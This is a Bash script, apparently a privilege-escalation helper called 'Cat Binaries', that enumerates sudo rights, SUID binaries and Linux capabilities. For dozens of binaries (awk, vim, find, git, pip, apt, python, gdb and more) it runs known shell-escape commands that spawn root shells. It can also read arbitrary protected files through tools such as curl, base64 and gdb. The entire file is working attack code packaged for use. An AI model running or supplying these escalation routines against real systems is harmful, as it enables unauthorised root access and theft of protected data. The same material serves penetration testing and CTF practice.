#!/bin/bash

SUPPORTED_FILE_READ_BINARIES=("gdb" "ruby" "python" "perl" "cp" "vim" "cat" "awk" "openvpn" "gcc" "base32" "base58" "sed" "base64" "arp" "bash" "curl" "more" "neofetch" "git" "dig")
SUPPORTED_SUDO_BINARIES=("awk" "ash" "chroot" "apt" "bash" "at" "lua" "choom" "sudo" "php" "pip" "tmux" "node" "pexec" "pkexec" "csh" "socat" "dash" "ruby" "python" "ed" "env" "ssh" "expect" "vi" "vim" "mount" "make" "git" "find" "ftp" "perl" "script" "gcc" "cp")
SUPPORTED_SUID_BINARIES=("ash" "gdb" "bash" "php" "chroot" "node" "pexec" "csh" "dash" "python" "env" "choom" "expect" "vim" "rvim" "vimdiff" "make" "find")
SUPPORTED_CAP_BINARIES=("gdb" "node" "php" "python" "ruby" "view" "vim" "rvim" "vimdiff")

CAPABILITIES=("cap_dac_read_search" "cap_dac_override" "cap_chown" "cap_setuid")
CAP_DESCRIPTION=( 
    "File reads! Available!"
    "Privileged ownership change of any file."
    "Privileged permission change of any file."
    "CAP_SETUID! Privileged Binary execution! Available!"
)

function banner_logo() {
    echo -e "
\033[0;33m ██████╗ █████╗ ████████╗    ██████╗ ██╗███╗   ██╗ █████╗ ██████╗ ██╗███████╗███████╗\033[0m    \033[0;31m/\_/\ \033[0m                        
\033[0;33m██╔════╝██╔══██╗╚══██╔══╝    ██╔══██╗██║████╗  ██║██╔══██╗██╔══██╗██║██╔════╝██╔════╝\033[0m   \033[0;31m( o.o ) \033[0m                    
\033[0;33m██║     ███████║   ██║       ██████╔╝██║██╔██╗ ██║███████║██████╔╝██║█████╗  ███████╗\033[0m    \033[0;31m> ^ <   _ \033[0m                
\033[0;33m██║     ██╔══██║   ██║       ██╔══██╗██║██║╚██╗██║██╔══██║██╔══██╗██║██╔══╝  ╚════██║\033[0m    \033[0;31m(   )  // \033[0m                 
\033[0;33m╚██████╗██║  ██║   ██║       ██████╔╝██║██║ ╚████║██║  ██║██║  ██║██║███████╗███████║\033[0m    \033[0;31m(| |)_// \033[0m                    
\033[0;33m ╚═════╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝\033[0m                          
"
}

function usage() {
    printf "Usage: %s [--bin <binary>] [--mode <operation mode>]\n" "$(basename "$0")"
    printf "  -b/--bin <binary>                 Specify binary for operation mode (In case you know which one is vulnerable)\n"
    printf "  -cb/--check_bin                   Activate allowed_executables function\n"
    printf "  -fr/--file_to_read                Specify the path of the file to read\n"
    printf "  -bc/--binary_capabilities         Find all the binaries with capabilities set on them across the entire filesystem\n"
    printf "  -cs/--check_suid                  Locate all binaries set with SUID (Set User Identification) permissions\n"
    printf "  -m/--mode <Operating Mode>        Specify operation mode (In case you know which operating mode will work)\n"
    printf "  -h/--help                         Show Help Message\n\n"
    printf "Operation Modes => [sudobin, bincap, suidbin, fileread]\n"
    exit 1
}

function check_sudo() {
    local sudo_perms list_users
    sudo_perms=$(sudo -v 2>&1)
    list_users=$(awk -F: '$6 ~ /\/home/ {print $1}' /etc/passwd)

    if [[ $sudo_perms =~ "Sorry, user may not run sudo" ]]; then
        printf "[\033[0;31mX\033[0m] User does not have access to sudo privileges on the system\n"
        printf "[\033[0;32m->\033[0m] Try these other ones:\n%s\n" "$list_users"
        return 1
    else
        printf "[\033[0;32mOK!\033[0m] User has got sudo rights!\n"
    fi
}

function sudo_binaries() {
    local sudo_output executables executable_list
    check_sudo || return 1

    sudo_output=$(sudo -l 2>/dev/null)
    if [[ -z "$sudo_output" ]]; then
        printf "[\033[0;31mX\033[0m] Failed to retrieve sudo list.\n" >&2
        return 1
    fi

    executables=$(printf "%s\n" "$sudo_output" | grep -oP '(/[\w/]+)' | awk -F'/' '{print $NF}' | sort -u)
    mapfile -t executable_list < <(printf "%s\n" "$executables")

    printf "[\033[0;32m>>>\033[0m] Executables allowed by sudo:\n"
    for executable in "${executable_list[@]}"; do
        echo -e "\033[0;36m$executable\033[0m"
    done
}

function modes() {
    local binary="$1" mode="$2" file_to_read="$3"
    
    if [[ $mode == "sudobin" || $mode == "sudo" ]]; then
        case $binary in
            awk) sudo awk 'BEGIN {system("/bin/sh")}' ;;
            ash) sudo ash ;;
            bash) sudo bash ;;
            pkexec) sudo pkexec /bin/sh ;;
            csh) sudo csh ;;
            chroot) sudo chroot / ;;
            socat) sudo socat stdin exec:/bin/sh ;;
            dash) sudo dash ;;
            ed) printf "[\033[0;31m*\033[0m] Execute:\n\033[0;36msudo ed\033[0m\n\033[0;36m!/bin/sh\033[0m\n" ;;
            env) sudo env /bin/sh ;;
            expect) sudo expect -c 'spawn /bin/sh;interact' ;;
            choom) sudo choom -n 0 /bin/sh ;;
            vi) sudo vi -c ':!/bin/sh' /dev/null ;;
            vim) sudo vim -c ':!/bin/sh' ;;
            lua) sudo lua -e 'os.execute("/bin/sh")' ;;
            ssh) sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x ;;
            apt) sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh ;;
            git)
                local tf
                tf=$(mktemp -d)
                ln -s /bin/sh "$tf/git-x"
                sudo git "--exec-path=$tf" x
                ;;
            find) sudo find . -exec /bin/sh \; -quit ;;
            ftp) printf "[\033[0;31m*\033[0m] Execute:\n\033[0;36msudo ftp\033[0m\n\033[0;36m!/bin/sh\033[0m\n" ;;
            perl) sudo perl -e 'exec "/bin/sh";' ;;
            script) sudo script -q /dev/null ;;
            gcc) sudo gcc -wrapper /bin/sh,-s . ;;
            cp)
                sudo cp /bin/sh /bin/cp
                sudo cp
                ;;
            at) echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null ;;
            mount) 
                sudo mount -o bind /bin/sh /bin/mount
                sudo mount ;;
            make)
                COMMAND='/bin/sh'
                sudo make -s --eval=$'x:\n\t-'"$COMMAND" ;;
            node) sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' ;;
            pexec) sudo pexec /bin/sh ;;
            ruby) sudo ruby -e 'exec "/bin/sh"' ;;
            python) sudo python -c 'import os; os.system("/bin/sh")' ;;
            sudo) sudo sudo /bin/sh ;;
            tmux) sudo tmux ;;
            pip) 
                TF=$(mktemp -d)
                echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
                sudo pip install $TF ;;
            php) 
                CMD="/bin/sh"
                sudo php -r "system('$CMD');" ;;
            *) return 1 ;;
        esac

    elif [[ $mode == "bincap" || $mode == "cap" || $mode == "capabilities" ]]; then
        case $binary in
            gdb) gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit ;;
            node) node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' ;;
            python) python -c 'import os; os.setuid(0); os.system("/bin/sh")' ;;
            php)
                CMD="/bin/sh"
                php -r "posix_setuid(0); system('$CMD');" ;;
            ruby) ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"' ;;
            rview) rview -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            rvim) rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            view) view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            vim) vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            vimdiff) vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            *) return 1 ;;
        esac

    elif [[ $mode == "fileread" || $mode == "read" || $mode == "file_read" ]]; then
        if [[ -z $file_to_read ]]; then
            echo -e "\033[0;31m[X]\033[0m Specify a file to read!\n"
            return 1
        else
            case $binary in
                gdb) gdb -nx -ex "python print(open('$file_to_read').read())" -ex quit ;;
                ruby) ruby -e "puts File.read('$file_to_read')" ;;
                python) python -c "print(open('$file_to_read').read())" ;;
                perl) perl -ne "print" "$file_to_read" ;;
                vim) vim "$file_to_read" ;;
                base32) base32 "$file_to_read" | base32 --decode ;;
                awk) awk '//' "$file_to_read" ;;
                base58) base58 "$file_to_read" | base58 --decode ;;
                base64) base64 "$file_to_read" | base64 --decode ;;
                arp) arp -v -f "$file_to_read" ;;
                bash)
                    HISTTIMEFORMAT=$'\r\e[K'
                    history -r "$file_to_read"
                    history ;;
                cat) cat "$file_to_read" ;;
                curl) curl "file://$file_to_read" ;;
                dig) dig -f "$file_to_read" ;;
                gcc) gcc -xc /dev/null -o "$file_to_read" ;;
                git) git diff /dev/null "$file_to_read" ;;
                more) more "$file_to_read" ;;
                neofetch) neofetch --ascii "$file_to_read" ;;
                openvpn) openvpn --config "$file_to_read" ;;
                sed) sed '' "$file_to_read" ;;
                cp) cp "$file_to_read" /dev/stdout ;;
                *) return 1 ;;
            esac
        fi

    elif [[ $mode == "suidbin" || $mode == "suid" || $mode == "SUID" ]]; then
        case $binary in
            ash) ash ;;
            bash) bash -p ;;
            php) php -r "pcntl_exec('/bin/sh', ['-p']);" ;;
            chroot) chroot / /bin/sh -p ;;
            node) node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})' ;;
            pexec) pexec /bin/sh -p ;;
            csh) csh -b ;;
            dash) dash -p ;;
            python) python -c 'import os; os.execl("/bin/sh", "sh", "-p")' ;;
            env) env /bin/sh -p ;;
            expect) expect -c 'spawn /bin/sh -p;interact' ;;
            vim) vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' ;;
            rvim) rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' ;;
            vimdiff) vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' ;;
            make) 
                COMMAND='/bin/sh -p'
                make -s --eval=$'x:\n\t-'"$COMMAND" ;;
            find) find . -exec /bin/sh -p \; -quit ;;
            choom) choom -n 0 -- /bin/sh -p ;;
            gdb) gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit ;;
            *) return 1 ;;
        esac
    fi

}

function list_capabilities() {
    echo -e "\033[0;33m[+]\033[0m Available Capabilities!...\n"
    getcap -r / 2>/dev/null
    echo -e "\n\033[0;33m-------------------------------------------\033[0m\n"

    local file
    
    while IFS= read -r -d '' file; do
        local caps
        caps=$(getcap "$file" 2>/dev/null)
        if [[ -n $caps ]]; then
            for i in "${!CAPABILITIES[@]}"; do
                if [[ $caps == *"${CAPABILITIES[$i]}"* ]]; then
                    echo -e "\033[1;37m$(basename "$file")\033[0m" "\033[1;36m${CAP_DESCRIPTION[$i]}\033[0m"
                fi
            done
        fi
    done < <(find / -type f -perm /u=x,g=x,o=x -print0 2>/dev/null)

    echo ""
}

function list_suid_binaries() {
    echo -e "\033[0;33m[+]\033[0m Finding Existing SUID Binaries!...\n"
    echo -e "\033[0;33m-------------------------------------------\033[0m\n"
    find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000
    echo -e "\n\033[0;33m-------------------------------------------\033[0m\n"

    local suid_binaries=()
    while IFS= read -r binary; do
        suid_binaries+=("$binary")
    done < <(find / -perm -u=s -type f -exec basename {} \; 2>/dev/null)

    local found_supported_binaries=()
    for binary in "${suid_binaries[@]}"; do
        for supported_binary in "${SUPPORTED_SUID_BINARIES[@]}"; do
            if [[ $binary == "$supported_binary" ]]; then
                found_supported_binaries+=("$binary")
            fi
        done
    done

    if [[ ${#found_supported_binaries[@]} -gt 0 ]]; then
        echo -e "\033[1;36m[>]\033[0m Try These:  "
        printf "%s\n" "${found_supported_binaries[@]}"
        echo ""
    else
        echo -e "\033[0;31m[-]\033[0m No supported SUID binaries found.\n"
    fi
}

function privilege_escalations() {
    local binary="$1" operation_mode="$2" file_to_read="$3" validate=0

    if [[ -z $operation_mode ]]; then
        echo -e "\033[0;31m[X]\033[0m Please select an operating mode => {sudo, capabilities, file_read}\n" >&2
        return 1
    fi

    if [[ $operation_mode == "sudobin" || $operation_mode == "sudo" || $operation_mode == "SUDO" ]]; then
        for supported_binary in "${SUPPORTED_SUDO_BINARIES[@]}"; do
            if [[ $supported_binary == "$binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $operation_mode == "bincap" || $operation_mode == "cap" || $operation_mode == "capabilities" ]]; then
        for supported_binary in "${SUPPORTED_CAP_BINARIES[@]}"; do
            if [[ $supported_binary == "$binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $operation_mode == "fileread" || $operation_mode == "read" || $operation_mode == "file_read" ]]; then
        for supported_binary in "${SUPPORTED_FILE_READ_BINARIES[@]}"; do
            if [[ $supported_binary == "$binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $operation_mode == "suidbin" || $operation_mode == "suid" || $operation_mode == "SUID" ]]; then
        for supported_binary in "${SUPPORTED_SUID_BINARIES[@]}"; do
            if [[ $supported_binary == "$binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $validate -ne 1 ]]; then
        printf "\033[0;31m[X]\033[0m %s not supported in this script :( \nmaybe later\n" "$binary" >&2
        return 1
    else
        printf "\033[0;32m[+]\033[0m Exploiting %s...\n" "$binary"
        modes "$binary" "$operation_mode" "$file_to_read"
    fi
}

function parse_args() {
    local bin_mode="" mode="" file_to_read="" suid_binaries=0 sudo_binaries=0 binary_capabilities=0 help=0

    while [[ $# -gt 0 ]]; do
        case $1 in
            --bin|-b)
                if [[ -z $2 ]]; then
                    printf "Error: --bin requires an argument\n" >&2
                    break
                fi
                bin_mode=$2
                shift 2
                ;;
            -m|--mode)
                if [[ -z $2 ]]; then
                    printf "Error: -m/--mode requires an argument\n" >&2
                    break
                fi
                mode=$2
                shift 2
                ;;
            --file_to_read|-fr)
                if [[ -z $2 ]]; then
                    printf "Error: --file_to_read requires an argument\n" >&2
                    break
                fi
                file_to_read=$2
                shift 2
                ;;
            -cs|--check_suid)
                suid_binaries=1
                shift
                ;;
            --check_bin|-cb)
                sudo_binaries=1
                shift
                ;;
            -bc|--binary_capabilities)
                binary_capabilities=1
                shift
                ;;
            -h|--help)
                help=1
                shift
                ;;
            -*|--*)
                printf "Error: Unknown option %s\n\n" "$1" >&2
                usage
                ;;
            *)
                break
                ;;
        esac
    done

    if [[ -n $bin_mode ]]; then
        privilege_escalations "$bin_mode" "$mode" "$file_to_read"
    fi

    if [[ $sudo_binaries -eq 1 ]]; then
        sudo_binaries
    fi

    if [[ $binary_capabilities -eq 1 ]]; then
        list_capabilities
    fi

    if [[ $suid_binaries -eq 1 ]]; then
        list_suid_binaries
    fi

    if [[ $help -eq 1 ]]; then
        usage
    fi
}

main() {
    if [[ $# -eq 0 ]]; then
        usage
    fi

    parse_args "$@"
}

banner_logo
main "$@"
